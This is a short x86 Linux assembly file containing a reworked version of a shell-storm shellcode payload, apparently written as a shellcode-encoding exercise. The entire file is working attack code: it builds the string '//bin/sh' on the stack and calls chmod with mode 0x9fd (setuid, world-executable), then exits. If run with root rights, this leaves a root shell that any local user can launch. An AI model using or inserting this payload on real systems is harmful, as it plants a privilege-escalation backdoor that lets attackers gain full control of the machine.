; original shellcode from shellstorm:
; http://shell-storm.org/shellcode/files/shellcode-550.php

; Due to security reasons, this code will only be edited but not executed


global _start

section .text

_start:
;	xor eax, eax			; zeroing out registers
	xor ebx, ebx
	mul ebx
	xor ecx, ecx

;	push ebx			; push NULL 0s
	mov dword [esp -4], ebx
	sub esp, 4

	;push 0x68732f6e			; push //bin/sh in reverse
	mov dword [esp - 4], 0x68732f6e
	;push 0x69622f2f
	mov dword [esp - 8], 0x69622f2f
	
	sub esp, 8
	
	mov ebx, esp			; moving current top of stack to ebx for sys call param
	mov cx, 0x9fd			; 2 param of mode for chmod syscall
	
	mov al, 0xf			; syscall for chmod
	int 0x80			; invoke

	mov al, 0x1			; exit syscall
	int 0x80			; exit
